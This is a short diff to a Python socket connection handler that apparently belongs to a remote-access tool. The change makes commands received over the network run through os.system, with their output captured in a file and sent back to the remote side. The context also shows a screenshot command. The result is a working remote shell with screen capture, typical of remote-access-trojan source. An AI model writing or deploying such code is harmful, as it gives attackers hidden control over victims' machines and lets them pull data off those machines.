@@ -58,7 +58,9 @@ def handleConnection(conn: socket, addr):
                 if msg[:3] == "cmd":
                     print(f"Remote system running command: {msg[3:]}")
                     print("Output: ", end="")
-                    os.system(msg[3:])
+                    os.system(f"{msg[3:]} > cmdout.txt")
+                    with open("cmdout.txt") as f:
+                        conn.send(f.read().encode(FORMAT))
                 elif msg == "screenshot":
                     screenshot()
                     temp = open("tempimage.png", "rb")
